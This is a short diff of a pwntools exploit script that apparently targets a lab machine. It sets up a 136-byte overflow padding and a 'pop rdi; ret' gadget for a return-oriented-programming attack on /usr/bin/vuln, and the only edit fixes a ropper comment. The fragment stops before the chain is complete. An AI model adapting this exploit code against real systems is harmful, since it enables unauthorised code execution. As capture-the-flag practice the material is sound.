@@ -3,7 +3,7 @@ from pwn import *
 s = ssh(host = '10.10.10.139')
 p = s.process('/usr/bin/vuln')
 padding = ("A" * 136).encode()
-#ropper --file garbage --search "pop rdi; ret;"
+#ropper --file vuln --search "pop rdi; ret;"
 pop_rdi = p64(0x138C54A1) 
 #Get these libc addresses from libc.so.6
 #/usr/lib/x86_64-linux-gnu
